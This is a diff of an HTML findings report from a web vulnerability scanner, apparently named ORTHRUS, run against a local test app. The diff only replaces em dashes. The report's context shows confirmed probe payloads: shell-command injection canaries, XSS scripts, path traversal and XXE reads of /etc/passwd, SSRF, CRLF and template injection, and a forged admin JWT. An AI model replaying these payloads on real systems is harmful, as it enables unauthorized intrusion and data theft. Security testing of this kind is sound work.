@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="utf-8">
-<title>Project ORTHRUS — Technical Report</title>
+<title>Project ORTHRUS - Technical Report</title>
 <style>
   :root { --brand: #c40000; }
   * { box-sizing: border-box; }
@@ -21,7 +21,7 @@
   th { background: #f6f8fa; }
   .sev { display: inline-block; padding: 2px 9px; border-radius: 10px; color: #fff;
          font-size: 11px; font-weight: 700; text-transform: uppercase; }
-  /* severity fills — red-intensity ramp; mirrors orthrus/utils/palette.py (SEVERITY_FILL) */
+  /* severity fills - red-intensity ramp; mirrors orthrus/utils/palette.py (SEVERITY_FILL) */
   .sev-critical { background: #8b0000; }
   .sev-high { background: #b71c1c; }
   .sev-medium { background: #c94f4f; }
@@ -47,10 +47,10 @@
 </style>
 </head>
 <body>
-<div class="classification">Internal — Authorized Personnel Only</div>
+<div class="classification">Internal - Authorized Personnel Only</div>
 <header class="brand">
   
-  <h1>Project ORTHRUS — Technical Findings Report</h1>
+  <h1>Project ORTHRUS - Technical Findings Report</h1>
   <div class="meta">
     Target: http://127.0.0.1:8791 &nbsp;·&nbsp; Scan: yc-demo-browser &nbsp;·&nbsp;
     Generated: 2026-07-10 18:50 India Standard Time
@@ -154,7 +154,7 @@
       <br><code>http://127.0.0.1:8791/</code></li>
     
   </ol>
-  <p><strong>Impact.</strong> A leaked signing key/secret lets an attacker mint their own valid tokens and authenticate as any user — full authentication bypass.</p>
+  <p><strong>Impact.</strong> A leaked signing key/secret lets an attacker mint their own valid tokens and authenticate as any user - full authentication bypass.</p>
 </div>
 
 <div class="finding">
@@ -172,7 +172,7 @@
       <br><code>http://127.0.0.1:8791/profile?id=2</code></li>
     
   </ol>
-  <p><strong>Impact.</strong> An attacker obtains a session via the authentication weakness, then escalates authorization to reach other users&#39; or admin data — full account/admin takeover.</p>
+  <p><strong>Impact.</strong> An attacker obtains a session via the authentication weakness, then escalates authorization to reach other users&#39; or admin data - full account/admin takeover.</p>
 </div>
 
 <div class="finding">
@@ -226,7 +226,7 @@
       <br><code>http://127.0.0.1:8791/oauth/authorize</code></li>
     
   </ol>
-  <p><strong>Impact.</strong> An open redirect on the OAuth flow lets an attacker steal authorization codes/tokens via redirect_uri abuse — account takeover.</p>
+  <p><strong>Impact.</strong> An open redirect on the OAuth flow lets an attacker steal authorization codes/tokens via redirect_uri abuse - account takeover.</p>
 </div>
 
 <div class="finding">
@@ -299,7 +299,7 @@
   
     <div class="kv">
       <strong>Confirmed</strong> via canary replay
-       — extracted: <code>ORTHRUSFDDC6698</code>
+       - extracted: <code>ORTHRUSFDDC6698</code>
     </div>
     <pre>GET http://127.0.0.1:8791/ping?host=127.0.0.1%3B+echo+ORTHRUSFDDC6698
 host: 127.0.0.1:8791
@@ -347,7 +347,7 @@ x-cache: MISS
     &nbsp;·&nbsp; parameter: <code>mutation systemDiagnostics(cmd)</code>
     
   </div>
-  <p>A shell metacharacter + canary injected into the GraphQL argument &#39;cmd&#39; of &#39;mutation systemDiagnostics&#39; was executed — the canary was echoed back by the OS shell, proving arbitrary command execution via a GraphQL resolver.</p>
+  <p>A shell metacharacter + canary injected into the GraphQL argument &#39;cmd&#39; of &#39;mutation systemDiagnostics&#39; was executed - the canary was echoed back by the OS shell, proving arbitrary command execution via a GraphQL resolver.</p>
   
     <strong>Request</strong>
     <pre>{&#39;query&#39;: &#39;mutation{ systemDiagnostics(cmd: &#34;; echo ORTHRUSGQLCMD9174&#34;) }&#39;}</pre>
@@ -360,7 +360,7 @@ x-cache: MISS
   
     <div class="kv">
       <strong>Confirmed</strong> via graphql command-injection replay
-       — extracted: <code>canary ORTHRUSGQLREda2e840031c0Z echoed</code>
+       - extracted: <code>canary ORTHRUSGQLREda2e840031c0Z echoed</code>
     </div>
     
     
@@ -386,7 +386,7 @@ x-cache: MISS
     
     
   </div>
-  <p>The upload endpoint /upload accepted a file with a dangerous &#39;.php&#39; extension. If uploaded files are served from the web root or interpreted by the server, an attacker can upload a web shell (RCE) or a .svg/.html for stored XSS. The probe uploaded a harmless inert marker, not a working payload — confirm where the file lands and whether it executes.</p>
+  <p>The upload endpoint /upload accepted a file with a dangerous &#39;.php&#39; extension. If uploaded files are served from the web root or interpreted by the server, an attacker can upload a web shell (RCE) or a .svg/.html for stored XSS. The probe uploaded a harmless inert marker, not a working payload - confirm where the file lands and whether it executes.</p>
   
     <strong>Request</strong>
     <pre>multipart upload: orthrus_test.php</pre>
@@ -475,7 +475,7 @@ x-cache: MISS
     
     
   </div>
-  <p>A value taken from the page URL reached the JavaScript sink &#39;innerHTML&#39;, which renders/executes its argument. Attacker-controlled URL data flowing into this sink is DOM-based cross-site scripting — exploited entirely client-side, so the server (and server-side filters) never see the payload.</p>
+  <p>A value taken from the page URL reached the JavaScript sink &#39;innerHTML&#39;, which renders/executes its argument. Attacker-controlled URL data flowing into this sink is DOM-based cross-site scripting - exploited entirely client-side, so the server (and server-side filters) never see the payload.</p>
   
   
   
@@ -516,7 +516,7 @@ x-cache: MISS
   
     <div class="kv">
       <strong>Confirmed</strong> via form-reflection reproduction
-       — extracted: <code>hcxd8201e2f</code>
+       - extracted: <code>hcxd8201e2f</code>
     </div>
     <pre>POST http://127.0.0.1:8791/comment  (text=hcxd8201e2f&lt;hcxd8201e2f&gt;hcxd8201e2f&#34;hcxd8201e2f&#39;hcxd8201e2f)</pre>
     
@@ -586,7 +586,7 @@ x-cache: MISS
   
     <div class="kv">
       <strong>Confirmed</strong> via browser-execution (global)
-       — extracted: <code>hcx7badb0a1</code>
+       - extracted: <code>hcx7badb0a1</code>
     </div>
     <pre>http://127.0.0.1:8791/render?name=%3Cscript%3Ewindow%5B%27__hx_hcx7badb0a1%27%5D%3D1%3C%2Fscript%3E</pre>
     
@@ -718,7 +718,7 @@ x-cache: MISS
   
     <div class="kv">
       <strong>Confirmed</strong> via browser-execution (global)
-       — extracted: <code>hcxfd41ac17</code>
+       - extracted: <code>hcxfd41ac17</code>
     </div>
     <pre>http://127.0.0.1:8791/chat?message=%3Cscript%3Ewindow%5B%27__hx_hcxfd41ac17%27%5D%3D1%3C%2Fscript%3E</pre>
     
@@ -819,7 +819,7 @@ x-cache: MISS
   
     <div class="kv">
       <strong>Confirmed</strong> via error-based replay
-       — extracted: <code>MySQL</code>
+       - extracted: <code>MySQL</code>
     </div>
     <pre>GET http://127.0.0.1:8791/sqli?id=1%27
 host: 127.0.0.1:8791
@@ -860,7 +860,7 @@ x-cache: MISS
     &nbsp;·&nbsp; parameter: <code>query userByName(name)</code>
     
   </div>
-  <p>Injecting a single quote into the GraphQL argument &#39;name&#39; of &#39;query userByName&#39; produced a MySQL database error, so the argument is concatenated into a SQL query unsanitised — SQL injection via GraphQL.</p>
+  <p>Injecting a single quote into the GraphQL argument &#39;name&#39; of &#39;query userByName&#39; produced a MySQL database error, so the argument is concatenated into a SQL query unsanitised - SQL injection via GraphQL.</p>
   
     <strong>Request</strong>
     <pre>{&#39;query&#39;: &#39;query{ userByName(name: &#34;orthrus_gql\&#39;&#34;) }&#39;}</pre>
@@ -873,7 +873,7 @@ x-cache: MISS
   
     <div class="kv">
       <strong>Confirmed</strong> via graphql sqli replay
-       — extracted: <code>MySQL error</code>
+       - extracted: <code>MySQL error</code>
     </div>
     
     
@@ -912,7 +912,7 @@ x-cache: MISS
   
     <div class="kv">
       <strong>Confirmed</strong> via graphql template-injection replay
-       — extracted: <code>evaluated to 4028033</code>
+       - extracted: <code>evaluated to 4028033</code>
     </div>
     
     
@@ -976,7 +976,7 @@ x-cache: MISS
   
     <div class="kv">
       <strong>Confirmed</strong> via forged a valid HS256 token with the recovered secret
-       — extracted: <code>forged-token-verified</code>
+       - extracted: <code>forged-token-verified</code>
     </div>
     <pre>forged JWT (HS256) with tampered claims [admin=true]</pre>
     
@@ -1013,7 +1013,7 @@ x-cache: MISS
   
     <div class="kv">
       <strong>Confirmed</strong> via autobind replay (fresh nonce)
-       — extracted: <code>account_balance, active, admin, approved, balance, credit, email_verified, enabled, grants, group, group_id, isAdmin, is_active, is_admin, is_staff, is_superuser, is_verified, owner_id, permissions, role, roles, scopes, user_id, verified</code>
+       - extracted: <code>account_balance, active, admin, approved, balance, credit, email_verified, enabled, grants, group, group_id, isAdmin, is_active, is_admin, is_staff, is_superuser, is_verified, owner_id, permissions, role, roles, scopes, user_id, verified</code>
     </div>
     <pre>POST http://127.0.0.1:8791/api/account  injected: account_balance, active, admin, approved, balance, credit, email_verified, enabled, grants, group, group_id, isAdmin, is_active, is_admin, is_staff, is_superuser, is_verified, owner_id, permissions, role, roles, scopes, user_id, verified</pre>
     
@@ -1050,7 +1050,7 @@ x-cache: MISS
   
     <div class="kv">
       <strong>Confirmed</strong> via error-based replay
-       — extracted: <code>nosql-driver-error</code>
+       - extracted: <code>nosql-driver-error</code>
     </div>
     <pre>GET http://127.0.0.1:8791/nosql?user=%27
 host: 127.0.0.1:8791
@@ -1111,7 +1111,7 @@ x-cache: MISS
   
     <div class="kv">
       <strong>Confirmed</strong> via expression replay
-       — extracted: <code>19662258</code>
+       - extracted: <code>19662258</code>
     </div>
     <pre>GET http://127.0.0.1:8791/render?name=%7B%7B5082%2A3869%7D%7D
 host: 127.0.0.1:8791
@@ -1237,7 +1237,7 @@ x-cache: MISS
   
     <div class="kv">
       <strong>Confirmed</strong> via prototype-pollution differential (fresh sentinel)
-       — extracted: <code>orthrusPP3a83cc5d3d</code>
+       - extracted: <code>orthrusPP3a83cc5d3d</code>
     </div>
     <pre>{&#34;__proto__&#34;:{&#34;orthrusPP3a83cc5d3d&#34;:&#34;polluted&#34;}}</pre>
     
@@ -1280,7 +1280,7 @@ Access-Control-Allow-Credentials: true</pre>
   
     <div class="kv">
       <strong>Confirmed</strong> via origin-reflection replay (fresh origin)
-       — extracted: <code>https://orthrus-confirm-8bfc133ae2.example</code>
+       - extracted: <code>https://orthrus-confirm-8bfc133ae2.example</code>
     </div>
     <pre>Origin: https://orthrus-confirm-8bfc133ae2.example</pre>
     <pre>Access-Control-Allow-Origin: https://orthrus-confirm-8bfc133ae2.example
@@ -1324,7 +1324,7 @@ Access-Control-Allow-Credentials: true</pre>
   
     <div class="kv">
       <strong>Confirmed</strong> via origin-reflection replay (fresh origin)
-       — extracted: <code>https://orthrus-confirm-ab90e05384.example</code>
+       - extracted: <code>https://orthrus-confirm-ab90e05384.example</code>
     </div>
     <pre>Origin: https://orthrus-confirm-ab90e05384.example</pre>
     <pre>Access-Control-Allow-Origin: https://orthrus-confirm-ab90e05384.example
@@ -1407,7 +1407,7 @@ Access-Control-Allow-Credentials: true</pre>
     
     
   </div>
-  <p>The Spring Boot Actuator (env) endpoint at /actuator/env is publicly reachable and returned its expected content. Management and framework endpoints commonly expose configuration, environment variables and secrets, runtime metrics, request history, or internal routes — valuable reconnaissance and, for some (e.g. Actuator env/heapdump), a direct path to credential disclosure or RCE.</p>
+  <p>The Spring Boot Actuator (env) endpoint at /actuator/env is publicly reachable and returned its expected content. Management and framework endpoints commonly expose configuration, environment variables and secrets, runtime metrics, request history, or internal routes - valuable reconnaissance and, for some (e.g. Actuator env/heapdump), a direct path to credential disclosure or RCE.</p>
   
   
   
@@ -1448,7 +1448,7 @@ Access-Control-Allow-Credentials: true</pre>
   
     <div class="kv">
       <strong>Confirmed</strong> via file-read replay
-       — extracted: <code>/etc/passwd</code>
+       - extracted: <code>/etc/passwd</code>
     </div>
     <pre>GET http://127.0.0.1:8791/download?file=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
 host: 127.0.0.1:8791
@@ -1532,7 +1532,7 @@ daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
   
     <div class="kv">
       <strong>Confirmed</strong> via oob-callback
-       — extracted: <code>127.0.0.1</code>
+       - extracted: <code>127.0.0.1</code>
     </div>
     <pre>POST http://127.0.0.1:8791/fetch
 host: 127.0.0.1:8791
@@ -1588,7 +1588,7 @@ content-type: application/x-www-form-urlencoded</pre>
   
     <div class="kv">
       <strong>Confirmed</strong> via oob-callback
-       — extracted: <code>127.0.0.1</code>
+       - extracted: <code>127.0.0.1</code>
     </div>
     <pre>GET http://127.0.0.1:8791/fetch?url=http%3A%2F%2F127.0.0.1%3A42956%2F7d19ab44682041d6
 host: 127.0.0.1:8791
@@ -1642,7 +1642,7 @@ cookie: sid=abc123def456; obj=O:8:&#34;stdClass&#34;:1:{s:4:&#34;user&#34;; toke
   
     <div class="kv">
       <strong>Confirmed</strong> via external-entity replay
-       — extracted: <code>/etc/passwd</code>
+       - extracted: <code>/etc/passwd</code>
     </div>
     <pre>POST http://127.0.0.1:8791/xml?doc=1
 host: 127.0.0.1:8791
@@ -1709,7 +1709,7 @@ daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
   
     <div class="kv">
       <strong>Confirmed</strong> via header-injection replay (fresh nonce)
-       — extracted: <code>ocrlfd6c8a1c63c</code>
+       - extracted: <code>ocrlfd6c8a1c63c</code>
     </div>
     <pre>url=&lt;CRLF payload nonce=ocrlfd6c8a1c63c&gt;</pre>
     <pre>HTTP 302
@@ -1892,7 +1892,7 @@ X-Orthrus-Crlf: ocrlfd6c8a1c63c</pre>
     
     
   </div>
-  <p>The GraphQL endpoint executed a query supplied via an HTTP GET request (?query=...). GET requests carry cookies, trigger no CORS preflight, and can be fired cross-site (e.g. via an &lt;img&gt;/&lt;script&gt;/navigation), so any state-changing operation reachable over GET is forgeable — cross-site request forgery against the GraphQL API.</p>
+  <p>The GraphQL endpoint executed a query supplied via an HTTP GET request (?query=...). GET requests carry cookies, trigger no CORS preflight, and can be fired cross-site (e.g. via an &lt;img&gt;/&lt;script&gt;/navigation), so any state-changing operation reachable over GET is forgeable - cross-site request forgery against the GraphQL API.</p>
   
     <strong>Request</strong>
     <pre>GET http://127.0.0.1:8791/graphql?query={__typename}</pre>
@@ -2068,7 +2068,7 @@ X-Orthrus-Crlf: ocrlfd6c8a1c63c</pre>
     
     
   </div>
-  <p>The Apache server-status endpoint at /server-status is publicly reachable and returned its expected content. Management and framework endpoints commonly expose configuration, environment variables and secrets, runtime metrics, request history, or internal routes — valuable reconnaissance and, for some (e.g. Actuator env/heapdump), a direct path to credential disclosure or RCE.</p>
+  <p>The Apache server-status endpoint at /server-status is publicly reachable and returned its expected content. Management and framework endpoints commonly expose configuration, environment variables and secrets, runtime metrics, request history, or internal routes - valuable reconnaissance and, for some (e.g. Actuator env/heapdump), a direct path to credential disclosure or RCE.</p>
   
   
   
@@ -2096,7 +2096,7 @@ X-Orthrus-Crlf: ocrlfd6c8a1c63c</pre>
     
     
   </div>
-  <p>The endpoint accepted a JSON array of operations and returned an array of results. Batching lets an attacker pack many operations into one request — amplifying rate-limited actions (e.g. login/OTP brute-force) and resource use.</p>
+  <p>The endpoint accepted a JSON array of operations and returned an array of results. Batching lets an attacker pack many operations into one request - amplifying rate-limited actions (e.g. login/OTP brute-force) and resource use.</p>
   
     <strong>Request</strong>
     <pre>[{&#39;query&#39;: &#39;{__typename}&#39;}, {&#39;query&#39;: &#39;{__typename}&#39;}]</pre>
@@ -2109,7 +2109,7 @@ X-Orthrus-Crlf: ocrlfd6c8a1c63c</pre>
   
     <div class="kv">
       <strong>Confirmed</strong> via query-batching replay
-       — extracted: <code>batched array honored</code>
+       - extracted: <code>batched array honored</code>
     </div>
     <pre>[{__typename},{__typename}]</pre>
     
@@ -2135,7 +2135,7 @@ X-Orthrus-Crlf: ocrlfd6c8a1c63c</pre>
     
     
   </div>
-  <p>The endpoint resolved all 100 aliases of a single field in one request with no cost/complexity limit. An attacker can multiply server work arbitrarily within one query — an alias-amplification DoS primitive.</p>
+  <p>The endpoint resolved all 100 aliases of a single field in one request with no cost/complexity limit. An attacker can multiply server work arbitrarily within one query - an alias-amplification DoS primitive.</p>
   
     <strong>Request</strong>
     <pre>100 aliases of __typename</pre>
@@ -2148,7 +2148,7 @@ X-Orthrus-Crlf: ocrlfd6c8a1c63c</pre>
   
     <div class="kv">
       <strong>Confirmed</strong> via alias-overloading replay
-       — extracted: <code>100 aliases resolved</code>
+       - extracted: <code>100 aliases resolved</code>
     </div>
     <pre>100 aliases of __typename</pre>
     
@@ -2187,7 +2187,7 @@ X-Orthrus-Crlf: ocrlfd6c8a1c63c</pre>
   
     <div class="kv">
       <strong>Confirmed</strong> via query-batching replay
-       — extracted: <code>batched array honored</code>
+       - extracted: <code>batched array honored</code>
     </div>
     <pre>[{__typename},{__typename}]</pre>
     
@@ -2294,7 +2294,7 @@ X-Orthrus-Crlf: ocrlfd6c8a1c63c</pre>
     
     
   </div>
-  <p>No &#39;state&#39; parameter is present, so the authorization response is not bound to the user&#39;s session — enabling login CSRF / authorization-code injection.</p>
+  <p>No &#39;state&#39; parameter is present, so the authorization response is not bound to the user&#39;s session - enabling login CSRF / authorization-code injection.</p>
   
   
   
@@ -2369,7 +2369,7 @@ X-Orthrus-Crlf: ocrlfd6c8a1c63c</pre>
   
     <div class="kv">
       <strong>Confirmed</strong> via redirect replay
-       — extracted: <code>https://orthrus-redirect.example/</code>
+       - extracted: <code>https://orthrus-redirect.example/</code>
     </div>
     <pre>GET http://127.0.0.1:8791/redirect?url=https%3A%2F%2Forthrus-redirect.example%2F
 host: 127.0.0.1:8791
@@ -2411,7 +2411,7 @@ Location: https://orthrus-redirect.example/</pre>
     
     
   </div>
-  <p>A sentinel host sent in the &#39;Host&#39;/&#39;X-Forwarded-Host&#39; request header was reflected back into an absolute URL in the body. When the application builds absolute URLs (password-reset and email-confirmation links, redirects, or script/link src) from the incoming host header, an attacker can set it to a domain they control. A victim who clicks the resulting link — e.g. a poisoned password-reset email — leaks the secret token to the attacker (account takeover); the same primitive enables web-cache poisoning and, where the host selects an upstream, SSRF.</p>
+  <p>A sentinel host sent in the &#39;Host&#39;/&#39;X-Forwarded-Host&#39; request header was reflected back into an absolute URL in the body. When the application builds absolute URLs (password-reset and email-confirmation links, redirects, or script/link src) from the incoming host header, an attacker can set it to a domain they control. A victim who clicks the resulting link - e.g. a poisoned password-reset email - leaks the secret token to the attacker (account takeover); the same primitive enables web-cache poisoning and, where the host selects an upstream, SSRF.</p>
   
     <strong>Request</strong>
     <pre>Host: orthrus-hhi.example
@@ -2425,7 +2425,7 @@ X-Forwarded-Host: orthrus-hhi.example</pre>
   
     <div class="kv">
       <strong>Confirmed</strong> via host-header reflection replay (fresh sentinel)
-       — extracted: <code>orthrus-hhi-d1b60044b8.example</code>
+       - extracted: <code>orthrus-hhi-d1b60044b8.example</code>
     </div>
     <pre>Host: orthrus-hhi-d1b60044b8.example
 X-Forwarded-Host: orthrus-hhi-d1b60044b8.example</pre>
